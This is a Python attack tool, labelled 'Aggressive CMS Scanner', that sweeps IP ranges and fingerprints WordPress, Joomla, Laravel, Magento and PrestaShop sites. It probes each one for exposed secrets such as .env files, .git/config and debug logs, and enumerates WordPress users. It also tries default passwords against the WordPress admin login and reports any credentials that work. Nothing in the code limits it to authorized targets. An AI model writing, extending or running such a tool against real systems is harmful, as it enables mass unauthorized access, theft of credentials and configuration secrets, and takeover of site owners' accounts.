import requests
import threading
import ipaddress
import argparse
from queue import Queue
from pyfiglet import Figlet
from flask import Flask, jsonify

# Suppress warnings
requests.packages.urllib3.disable_warnings()

# Global config & storage
CMS_SIGNATURES = {
    "WordPress": ["/wp-login.php", "/wp-admin/", "/xmlrpc.php"],
    "Joomla": ["/administrator/", "/language/en-GB/en-GB.xml"],
    "Laravel": ["/.env", "/vendor/phpunit/phpunit/phpunit"],
    "Magento": ["/admin/", "/magento_version"],
    "PrestaShop": ["/admin-dev/", "/modules/"]
}

CMS_EXPLOITS = {
    "WordPress": ["/wp-json/wp/v2/users", "/wp-content/debug.log"],
    "Joomla": ["/administrator/manifests/files/joomla.xml"],
    "Laravel": ["/.env"],
    "Magento": ["/.git/config", "/errors/report.xml"],
    "PrestaShop": ["/admin-dev/autoupgrade/tmp/log.txt"]
}

scan_results = []  # For Flask API
TARGETS = Queue()

# Flask setup
app = Flask(__name__)

@app.route("/results")
def get_results():
    return jsonify(scan_results)

def detect_cms(url):
    try:
        for cms, paths in CMS_SIGNATURES.items():
            for path in paths:
                r = requests.get(url + path, verify=False, timeout=5)
                if r.status_code in [200, 401, 403]:
                    result = f"[+] {url} → {cms} (found: {path})"
                    print(result)
                    scan_results.append({"url": url, "cms": cms, "info": result})
                    return cms
        msg = f"[-] {url} CMS not identified."
        print(msg)
        scan_results.append({"url": url, "cms": None, "info": msg})
        return None
    except requests.RequestException:
        msg = f"[!] {url} unreachable."
        print(msg)
        scan_results.append({"url": url, "cms": None, "info": msg})
        return None

def scan_vulns(url, cms):
    if not cms:
        return
    for path in CMS_EXPLOITS.get(cms, []):
        try:
            full_url = url + path
            r = requests.get(full_url, verify=False, timeout=5)
            if r.status_code == 200 and len(r.text) > 20:
                msg = f"[!!!] Exposed file: {url}{path}"
                print(msg)
                scan_results.append({"url": url, "cms": cms, "info": msg})
        except:
            continue

def brute_force_stub(url, cms):
    if cms == "WordPress":
        login_url = url + "/wp-login.php"
        username = "admin"
        passwords = ["admin", "123456", "password", "admin123"]
        print(f"[*] Brute-force stub: {url}")
        for pwd in passwords:
            try:
                r = requests.post(login_url, data={"log": username, "pwd": pwd}, allow_redirects=False, timeout=5)
                if "wp-admin" in r.headers.get("Location", ""):
                    msg = f"[+] VALID LOGIN FOUND: {username}:{pwd} at {url}"
                    print(msg)
                    scan_results.append({"url": url, "cms": cms, "info": msg})
                    break
            except:
                continue

def worker():
    while not TARGETS.empty():
        target = TARGETS.get()
        url = target if target.startswith("http") else f"http://{target}"
        cms = detect_cms(url)
        scan_vulns(url, cms)
        brute_force_stub(url, cms)
        TARGETS.task_done()

def load_targets(file):
    with open(file) as f:
        for line in f:
            entry = line.strip()
            if '/' in entry:
                try:
                    net = ipaddress.ip_network(entry, strict=False)
                    for ip in net.hosts():
                        TARGETS.put(str(ip))
                except ValueError:
                    print(f"[!] Invalid CIDR: {entry}")
            else:
                TARGETS.put(entry)

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def main():
    parser = argparse.ArgumentParser(description="Aggressive CMS Scanner by Sean")
    parser.add_argument('--targets', type=str, required=True, help='Path to targets.txt')
    parser.add_argument('--threads', type=int, default=20, help='Number of threads')
    parser.add_argument('--web', action='store_true', help='Enable live Flask panel')
    args = parser.parse_args()

    # Banner
    f = Figlet(font='slant')
    print(f.renderText('Sean'))

    # Load targets
    print("[*] Loading targets...")
    load_targets(args.targets)

    # Optional: run Flask panel
    if args.web:
        threading.Thread(target=run_flask, daemon=True).start()
        print("[*] Live panel available at http://localhost:5000/results")

    # Start scanning
    print(f"[*] Starting scanner with {args.threads} threads...\n")
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    TARGETS.join()
    print("\n[✓] Scan complete.")

if __name__ == "__main__":
    main()
